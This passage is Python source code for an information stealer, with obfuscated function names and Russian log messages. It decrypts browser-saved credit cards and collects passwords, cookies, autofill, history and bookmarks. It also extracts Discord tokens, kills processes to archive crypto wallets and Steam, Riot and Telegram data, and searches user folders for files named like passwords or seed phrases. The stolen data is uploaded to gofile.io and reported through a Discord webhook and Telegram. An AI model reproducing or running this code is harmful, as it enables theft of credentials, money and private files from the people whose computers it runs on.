        tempfold = temp + "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}")
                CC5C0UNt += 1
        Wr173F0rF113(CCs, 'creditcards')
    except:pass

def G374U70F111(path, arg):
    try:
        global AU70F11l, AU70F111C0UNt
        if not os.path.exists(path):
            log_message(f"G374U70F111: путь {path} не существует")
            return
        pathC = path + arg + "/Web Data"
        log_message(f"G374U70F111: проверяю файл Web Data {pathC}")
        if not os.path.exists(pathC):
            log_message(f"G374U70F111: файл Web Data не существует")
            return
        if os.stat(pathC).st_size == 0:
            log_message(f"G374U70F111: файл Web Data пуст")
            return
        tempfold = os.path.join(temp, "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db")
        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM autofill WHERE value NOT NULL")
        log_message(f"G374U70F111: получено {len(data)} записей из SQL")
        for row in data:
            if row[0] != '':
                AU70F11l.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AU70F111C0UNt += 1
        log_message(f"G374U70F111: добавлено {len(AU70F11l)} записей в глобальный список")
        if AU70F11l:
            Wr173F0rF113(AU70F11l, 'autofills')
            log_message(f"G374U70F111: файл csautofills.txt создан")
        else:
            log_message(f"G374U70F111: нет данных для записи")
    except Exception as e:
        log_message(f"G374U70F111 ошибка: {e}")

def G37H1570rY(path, arg):
    try:
        global H1570rY, H1570rYC0UNt
        if not os.path.exists(path):
            log_message(f"G37H1570rY: путь {path} не существует")
            return
        pathC = path + arg + "History"
        log_message(f"G37H1570rY: проверяю файл истории {pathC}")
        if not os.path.exists(pathC):
            log_message(f"G37H1570rY: файл истории не существует")
            return
        if os.stat(pathC).st_size == 0:
            log_message(f"G37H1570rY: файл истории пуст")
            return
        tempfold = os.path.join(temp, "cs" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db")
        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM urls")
        log_message(f"G37H1570rY: получено {len(data)} записей из SQL")
        for row in data:
            if row[0] != '':
                H1570rY.append(row[1])
                H1570rYC0UNt += 1
        log_message(f"G37H1570rY: добавлено {len(H1570rY)} записей в глобальный список")
        if H1570rY:
            Wr173F0rF113(H1570rY, 'histories')
            log_message(f"G37H1570rY: файл cshistories.txt создан")
        else:
            log_message(f"G37H1570rY: нет данных для записи")
    except Exception as e:
        log_message(f"G37H1570rY ошибка: {e}")

def G37W3851735(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = r3F0rM47(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def G37800KM4rK5(path, arg):
    try:
        global B00KM4rK5, B00KM4rK5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        B00KM4rK5.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        B00KM4rK5C0UNt += 1
                    except:pass
        if os.stat(pathC).st_size == 0: return
        Wr173F0rF113(B00KM4rK5, 'bookmarks')
    except:pass

def s74r787Hr34D(func, arg):
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)

def G378r0W53r5(br0W53rP47H5):
    log_message("G378r0W53r5 запущена")
    global Browserthread, C00K13s, C00K1C0UNt, c00K1W0rDs, P455w, P455WC0UNt, p45WW0rDs
    global CCs, CC5C0UNt, AU70F11l, AU70F111C0UNt, H1570rY, H1570rYC0UNt, B00KM4rK5, B00KM4rK5C0UNt
    global PASSWORDS_LINK, COOKIES_LINK, CREDITCARDS_LINK, AUTOFILLS_LINK, HISTORIES_LINK, BOOKMARKS_LINK

    ThCokk, Browserthread, filess = [], [], []
    for patt in br0W53rP47H5:
        a = threading.Thread(target=G37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)
        s74r787Hr34D(G374U70F111,       [patt[0], patt[3]])
        s74r787Hr34D(G37H1570rY,        [patt[0], patt[3]])
        s74r787Hr34D(G37800KM4rK5,      [patt[0], patt[3]])
        s74r787Hr34D(G37CC5,            [patt[0], patt[3]])
        s74r787Hr34D(G37P455W,          [patt[0], patt[3]])
    for thread in ThCokk: thread.join()
    if TrU57(C00K13s) == True: sys.exit(0)
    for thread in Browserthread: thread.join()

    log_message(f"Passwords: {len(P455w)}")
    log_message(f"Cookies: {len(C00K13s)}")
    log_message(f"Credit Cards: {len(CCs)}")
    log_message(f"Autofills: {len(AU70F11l)}")
    log_message(f"History: {len(H1570rY)}")
    log_message(f"Bookmarks: {len(B00KM4rK5)}")

    file_list = ["cspasswords.txt", "cscookies.txt", "cscreditcards.txt", "csautofills.txt", "cshistories.txt", "csbookmarks.txt"]
    for file in file_list:
        file_path = os.path.join(temp, file)
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            link = UP104D7060F113(file_path)
            filess.append(link if link else "")
        else:
            filess.append("")

    PASSWORDS_LINK = filess[0] if filess[0] else ""
    COOKIES_LINK = filess[1] if filess[1] else ""
    CREDITCARDS_LINK = filess[2] if filess[2] else ""
    AUTOFILLS_LINK = filess[3] if filess[3] else ""
    HISTORIES_LINK = filess[4] if filess[4] else ""
    BOOKMARKS_LINK = filess[5] if filess[5] else ""

    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
    passwords_link = f"[{cname}Passwords.txt]({filess[0]})" if filess[0] else f"{cname}Passwords.txt (ошибка загрузки)"
    cookies_link = f"[{cname}Cookies.txt]({filess[1]})" if filess[1] else f"{cname}Cookies.txt (ошибка загрузки)"
    cc_link = f"[{cname}CreditCards.txt]({filess[2]})" if filess[2] else f"{cname}CreditCards.txt (ошибка загрузки)"
    autofill_link = f"[{cname}Autofills.txt]({filess[3]})" if filess[3] else f"{cname}Autofills.txt (ошибка загрузки)"
    history_link = f"[{cname}Histories.txt]({filess[4]})" if filess[4] else f"{cname}Histories.txt (ошибка загрузки)"
    bookmarks_link = f"[{cname}Bookmarks.txt]({filess[5]})" if filess[5] else f"{cname}Bookmarks.txt (ошибка загрузки)"

    data = {
        "content": GLINFO,
        "embeds": [
            {"title": f"{cname} | Password {words}", "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n<:blackarrow:1095740975197995041> • {passwords_link}", "color": 2895667, "footer": {"text": f"{footerc}", "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}},
            {"title": f"{cname} | Cookies {words}", "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:browser:1095742866518716566> • **{C00K1C0UNt}** Cookies Found\n<:blackarrow:1095740975197995041> • {cookies_link}", "color": 2895667, "footer": {"text": f"{footerc}", "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}},
            {"title": f"{cname} | Browser Data", "description": f"<:srcr_newspaper:1187579795056373782> • **{H1570rYC0UNt}** Histories Found\n<:blackarrow:1095740975197995041> • {history_link}\n\n<:lol_role_fill:1187747599286018149> • **{AU70F111C0UNt}** Autofills Found\n<:blackarrow:1095740975197995041> • {autofill_link}\n\n<:1SW_CreditCard:1187580159495245876> • **{CC5C0UNt}** Credit Cards Found\n<:blackarrow:1095740975197995041> • {cc_link}\n\n<:black_book:1187577552739508286> • **{B00KM4rK5C0UNt}** Bookmarks Found\n<:blackarrow:1095740975197995041> • {bookmarks_link}", "color": 2895667, "footer": {"text": f"{footerc}", "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}}
        ],
        "username": f"{cname} | t.me/{smallcname}r",
        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
    }
    try:
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        log_message("Сводка браузерных данных отправлена")
    except Exception as e:
        log_message(f"Ошибка отправки сводки: {str(e)}")

def G47H3rZ1P5(paths1, paths2, paths3):
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    thttht = []
    for walletids in w411375:
        for patt in paths1:
            a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)
    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)
    for thread in thttht:
        thread.join()
    wal, ga, ot = "", "", ""
    if len(W411375Z1p) != 0:
        wal = "<:ETH:975438262053257236>  •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if len(G4M1N6Z1p) != 0:
        ga = "<:blackgengar:1111366900690202624>  •  Gaming:\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if len(O7H3rZ1p) != 0:
        ot = "<:black_planet:1095740276850569226>  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
    data = {
        "content": GLINFO,
        "embeds": [{"title": f"{cname} | App {words}", "description": f"{wal}\n{ga}\n{ot}", "color": 2895667, "footer": {"text": f"{footerc}", "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}}],
        "username": f"{cname} | t.me/{smallcname}r",
        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
    }
    try:
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        log_message("Сводка приложений отправлена")
    except: pass

def Z1P73136r4M(path, arg, procc):
    log_message(f"Z1P73136r4M запущена: path={path}, arg={arg}, procc={procc}")
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC):
        log_message(f"Папка не существует: {pathC}")
        return
    try:
        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
        time.sleep(1)
    except Exception as e:
        log_message(f"Не удалось завершить процесс {procc}: {str(e)}")
    Z1PF01D3r(name, pathC)
    log_message(f"Архив {name}.zip создан")
    lnik = None
    for i in range(3):
        lnik = UP104D7060F113(os.path.join(temp, f"{name}.zip"))
        if lnik and "https://" in lnik:
            log_message(f"Архив {name} загружен, ссылка: {lnik}")
            break
        log_message(f"Попытка {i+1} загрузки не удалась, повтор через 4 сек")
        time.sleep(4)
    try:
        os.remove(os.path.join(temp, f"{name}.zip"))
        log_message(f"Временный архив {name}.zip удалён")
    except Exception as e:
        log_message(f"Не удалось удалить архив {name}.zip: {str(e)}")
    if lnik:
        O7H3rZ1p.append([arg, lnik])
        log_message(f"Добавлена запись в O7H3rZ1p: {arg} -> {lnik}")
    else:
        log_message(f"Не удалось загрузить архив {name}.zip")

def Z1P7H1N65(path, arg, procc):
    log_message(f"Z1P7H1N65: path={path}, arg={arg}, procc={procc}")
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    pathC = path
    name = arg
    for walllts in w411375:
        if str(walllts[0]) in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{str(walllts[1])}_{browser}"
            pathC = path + arg
    if not os.path.exists(pathC):
        log_message(f"Папка не существует: {pathC}")
        return
    try:
        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
        time.sleep(1)
    except Exception as e:
        log_message(f"Ошибка при завершении процесса {procc}: {e}")
    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"
    elif "Steam" in arg:
        steam_file = os.path.join(pathC, "loginusers.vdf")
        if not os.path.isfile(steam_file):
            log_message("Steam: loginusers.vdf не найден")
            return
        with open(steam_file, "r", encoding="utf8") as f:
            if 'RememberPassword"\t\t"1"' not in f.read():
                log_message("Steam: нет сохранённого пароля")
                return
        name = arg
    Z1PF01D3r(name, pathC)
    log_message(f"Архив создан: {name}")
    lnik = None
    for i in range(3):
        lnik = UP104D7060F113(os.path.join(temp, f"{name}.zip"))
        if lnik:
            break
        time.sleep(4)
    if lnik:
        log_message(f"Архив загружен: {lnik}")
        if "/Local Extension Settings/" in arg or "/HougaBouga/" in arg or "wallet" in arg.lower():
            W411375Z1p.append([name, lnik])
        elif "Steam" in name or "RiotCli" in name:
            G4M1N6Z1p.append([name, lnik])
        else:
            O7H3rZ1p.append([name, lnik])
    else:
        log_message(f"Не удалось загрузить архив {name}")
    try:
        os.remove(os.path.join(temp, f"{name}.zip"))
    except: pass

def S74r77Hr34D(meth, args = []):
    a = threading.Thread(target=meth, args=args)
    a.start()
    THr34D1157.append(a)

def G47H3r411():
    log_message("G47H3r411 запущена")
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    br0W53rP47H5 = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]
    d15C0rDP47H5 = [
        [f"{roaming}/discord",          "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
        [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
    ]

    p47H570Z1P = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Guarda/Local Storage/leveldb",                             "Guarda.exe",               "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        ["C:\Program Files (x86)\Steam\config",                                 "steam.exe",                "Steam"         ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
    ]
    t3136r4M = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]


    for patt in br0W53rP47H5:
       S74r77Hr34D(G3770K3N,   [patt[0], patt[2]]                                   )
    for patt in d15C0rDP47H5:
       S74r77Hr34D(G37D15C0rD, [patt[0], patt[1]]                                   )
    S74r77Hr34D(G378r0W53r5,   [br0W53rP47H5,]                                      )
    S74r77Hr34D(G47H3rZ1P5,    [br0W53rP47H5, p47H570Z1P, t3136r4M]                 )
    
    # Ждём завершения ВСЕХ потоков (без таймаута)
    for thread in THr34D1157:
        thread.join()

def G37D15C0rD(path, arg):
    if not os.path.exists(f"{path}/Local State"): return
    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global T0K3Ns
                        tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if CH3CK70K3N(tokenDecoded):
                            if not tokenDecoded in T0K3Ns:
                                T0K3Ns += tokenDecoded
                                UP104D70K3N(tokenDecoded, path)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def UP104D7060F113(path):
    try:
        server = "store4"
        log_message(f"Загрузка на {server}.gofile.io: {path}")
        file_size = os.path.getsize(path)
        log_message(f"Размер файла: {file_size} байт")
        with open(path, 'rb') as f:
            response = requests.post(f"https://{server}.gofile.io/uploadFile", files={'file': f}, timeout=120)  # было 60
        log_message(f"Статус ответа: {response.status_code}")
        log_message(f"Тело ответа (первые 500): {response.text[:500]}")
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get('status') == 'ok':
                    download_page = data['data']['downloadPage']
                    log_message(f"Ссылка: {download_page}")
                    return download_page
                else:
                    log_message(f"Ошибка в JSON: {data}")
                    return False
            except Exception as e:
                log_message(f"Не удалось распарсить JSON: {e}")
                import re
                match = re.search(r'"downloadPage"\s*:\s*"([^"]+)"', response.text)
                if match:
                    link = match.group(1)
                    log_message(f"Ссылка (regex): {link}")
                    return link
                else:
                    log_message("Не удалось найти ссылку в ответе")
                    return False
        else:
            log_message(f"HTTP ошибка {response.status_code}")
            return False
    except Exception as e:
        log_message(f"Исключение в загрузке: {str(e)}")
        return False

def K1W1F01D3r(pathF, keywords):
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = UP104D7060F113(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    K1W1F113s.append(["folder", pathF + "/", ffound])

K1W1F113s = []

def K1W1F113(path, keywords):
    log_message(f"Поиск в {path}")
    global K1W1F113s
    try:
        listOfFile = os.listdir(path)
    except Exception as e:
        log_message(f"Не удалось прочитать {path}: {str(e)}")
        return
    for file in listOfFile:
        for keyword in keywords:
            if keyword in file.lower():
                full_path = os.path.join(path, file)
                log_message(f"Найдено совпадение: {file}")
                if os.path.isfile(full_path) and os.path.getsize(full_path) < 500000 and not file.endswith('.lnk'):
                    url = UP104D7060F113(full_path)
                    if url:
                        K1W1F113s.append(["file", full_path, [[file, url]]])
                        log_message(f"Загружен файл: {file}, ссылка: {url}")
                    else:
                        log_message(f"Не удалось загрузить {file}")
                    break
                if os.path.isdir(full_path):
                    log_message(f"Переход в папку {full_path}")
                    K1W1F01D3r(full_path, keywords)
                    break

def K1W1():
    user = temp.split("\AppData")[0]
    path2search = [
        user    + "/Desktop",
        user    + "/Downloads",
        user    + "/Documents",
        roaming + "/Microsoft/Windows/Recent",
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "bot",
        "atomic",
        "account",
        "acount",
        "paypal",
        "banque",
        "bot",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "seed",
        "mnemonic"
        "memoric",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
        "bank",
        "info",
        "casino",
        "prv",
        "privé",
        "prive",
        "telegram",
        "identifiant",
        "personnel",
        "trading"
        "bitcoin",
        "sauvegarde",
        "funds",
        "récupé",
        "recup",
        "note",
    ]
   
    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith

def filestealr():
    log_message("filestealr запущена")
    global K1W1F113s, GLINFO, FILES_ARCHIVE_LINK
    log_message(f"Найдено записей в K1W1F113s: {len(K1W1F113s)}")

    # Собираем все файлы
    all_files = []
    for entry in K1W1F113s:
        if entry[0] == "file":
            all_files.append(entry[1])
        elif entry[0] == "folder":
            for file_info in entry[2]:
                all_files.append(file_info[0])

    log_message(f"Всего собрано файлов: {len(all_files)}")

    if not all_files:
        log_message("Нет файлов для архивации")
        FILES_ARCHIVE_LINK = ""
        return

    # Создаём временную папку и копируем файлы
    import tempfile
    import shutil
    temp_dir = tempfile.mkdtemp()
    copied_count = 0
    for src_path in all_files:
        if not os.path.exists(src_path):
            log_message(f"Файл не существует: {src_path}")
            continue
        base_name = os.path.basename(src_path)
        dest_path = os.path.join(temp_dir, base_name)
        if os.path.exists(dest_path):
            name, ext = os.path.splitext(base_name)
            dest_path = os.path.join(temp_dir, f"{name}_{copied_count}{ext}")
        try:
            shutil.copy2(src_path, dest_path)
            copied_count += 1
        except Exception as e:
            log_message(f"Ошибка копирования {src_path}: {e}")

    log_message(f"Скопировано файлов: {copied_count}")

    if copied_count == 0:
        log_message("Не удалось скопировать ни одного файла")
        shutil.rmtree(temp_dir, ignore_errors=True)
        FILES_ARCHIVE_LINK = ""
        return

    # Архивируем
    archive_name = f"files_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    zip_path = os.path.join(temp, f"{archive_name}.zip")
    try:
        with ZipFile(zip_path, 'w', ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(temp_dir):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, temp_dir)
                    zipf.write(full_path, arcname)
        log_message(f"Архив создан: {zip_path}")
    except Exception as e:
        log_message(f"Ошибка создания архива: {e}")
        shutil.rmtree(temp_dir, ignore_errors=True)
        FILES_ARCHIVE_LINK = ""
        return

    # Загружаем архив
    archive_link = UP104D7060F113(zip_path)
    try:
        os.remove(zip_path)
    except: pass
    shutil.rmtree(temp_dir, ignore_errors=True)

    if not archive_link:
        log_message("Не удалось загрузить архив")
        FILES_ARCHIVE_LINK = ""
        return

    FILES_ARCHIVE_LINK = archive_link
    log_message(f"Архив загружен: {archive_link}")

    # Формируем список файлов для Discord (только имена)
    filetext = "\n"
    for entry in K1W1F113s:
        if len(entry[2]) == 0:
            continue
        foldpath = entry[1].replace("\\", "/")
        filetext += f"📁 {foldpath}\n"
        for file_info in entry[2]:
            filename = os.path.basename(file_info[0])
            filetext += f"└─<:openfolder:1111408286332375040> {filename}\n"
        filetext += "\n"

    # Отправляем в Discord с ссылкой на архив
    UP104D("kiwi", filetext, archive_link)
    log_message("filestealr завершена")

def send_telegram_summary():
    """Отправляет итоговое сообщение в Telegram (напрямую) и через API."""
    global GLINFO, PASSWORDS_LINK, COOKIES_LINK, CREDITCARDS_LINK, AUTOFILLS_LINK, HISTORIES_LINK, BOOKMARKS_LINK, FILES_ARCHIVE_LINK
    global P455WC0UNt, C00K1C0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt
    global p45WW0rDs, c00K1W0rDs

    log_message("send_telegram_summary вызвана")

    # Получаем номер лога
    log_number = get_next_log_number()
    log_message(f"Отправка лога #{log_number}")

    # Функция для преобразования кода страны в эмодзи флага
    def flag_emoji(code):
        return ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in code.upper())

    import re
    GLINFO = re.sub(r':flag_([a-z]{2}):', lambda m: flag_emoji(m.group(1)), GLINFO)

    # Разбор GLINFO
    separator = ' - '
    if separator in GLINFO:
        flag_part, rest = GLINFO.split(separator, 1)
    else:
        flag_part = ''
        rest = GLINFO

    flag_part = flag_part.strip()
    rest = rest.strip()
    rest = rest.strip('`')

    if ' | ' in rest:
        name_part, rest2 = rest.split(' | ', 1)
        if '(' in rest2:
            ip_part = rest2.split(' (')[0]
            country_part = rest2.replace(ip_part, '').strip()
        else:
            ip_part = rest2
            country_part = ''
    else:
        name_part = rest
        ip_part = ''
        country_part = ''

    header_parts = []
    if flag_part:
        header_parts.append(flag_part)
    header_parts.append(separator)
    if name_part and ip_part:
        header_parts.append(f'<code>{name_part} | {ip_part}</code>')
    elif name_part:
        header_parts.append(f'<code>{name_part}</code>')
    if country_part:
        header_parts.append(f' {country_part}')
    header = ''.join(header_parts)

    html_parts = []
    html_parts.append(header)
    html_parts.append(f"\n<b>Log #{log_number}</b>")

    def extract_link(text):
        if '[' in text and ']' in text and '(' in text:
            name = text.split('[')[1].split(']')[0]
            url = text.split('(')[1].split(')')[0]
            return name, url
        return text, None

    # Password Files
    if P455WC0UNt > 0:
        html_parts.append("\n<b>Password Files</b>")
        if p45WW0rDs:
            links = []
            for item in p45WW0rDs:
                name, url = extract_link(item)
                if url:
                    links.append(f'<a href="{url}">{name}</a>')
                else:
                    links.append(name)
            html_parts.append(f"Found: {' | '.join(links)}")
        html_parts.append("Data:")
        html_parts.append(f"<blockquote>🗝 • <b>{P455WC0UNt} Passwords Found</b></blockquote>")
        if PASSWORDS_LINK:
            html_parts.append(f'➡️ • <a href="{PASSWORDS_LINK}">Passwords.txt</a>')

    # Cookies Files
    if C00K1C0UNt > 0:
        html_parts.append("\n<b>Cookies Files</b>")
        if c00K1W0rDs:
            links = []
            for item in c00K1W0rDs:
                name, url = extract_link(item)
                if url:
                    links.append(f'<a href="{url}">{name}</a>')
                else:
                    links.append(name)
            html_parts.append(f"Found: {' | '.join(links)}")
        html_parts.append("Data:")
        html_parts.append(f"<blockquote>📃 • <b>{C00K1C0UNt} Cookies Found</b></blockquote>")
        if COOKIES_LINK:
            html_parts.append(f'➡️ • <a href="{COOKIES_LINK}">Cookies.txt</a>')

    # Остальные разделы
    if H1570rYC0UNt > 0:
        html_parts.append(f"\n<blockquote>📋 • <b>{H1570rYC0UNt} Histories Found</b></blockquote>")
        if HISTORIES_LINK:
            html_parts.append(f'➡️ • <a href="{HISTORIES_LINK}">Histories.txt</a>')
    if AU70F111C0UNt > 0:
        html_parts.append(f"\n<blockquote>📤 • <b>{AU70F111C0UNt} Autofills Found</b></blockquote>")
        if AUTOFILLS_LINK:
            html_parts.append(f'➡️ • <a href="{AUTOFILLS_LINK}">Autofills.txt</a>')
    if CC5C0UNt > 0:
        html_parts.append(f"\n<blockquote>💳 • <b>{CC5C0UNt} Credit Cards Found</b></blockquote>")
        if CREDITCARDS_LINK:
            html_parts.append(f'➡️ • <a href="{CREDITCARDS_LINK}">CreditCards.txt</a>')
    if B00KM4rK5C0UNt > 0:
        html_parts.append(f"\n<blockquote>📕 • <b>{B00KM4rK5C0UNt} Bookmarks Found</b></blockquote>")
        if BOOKMARKS_LINK:
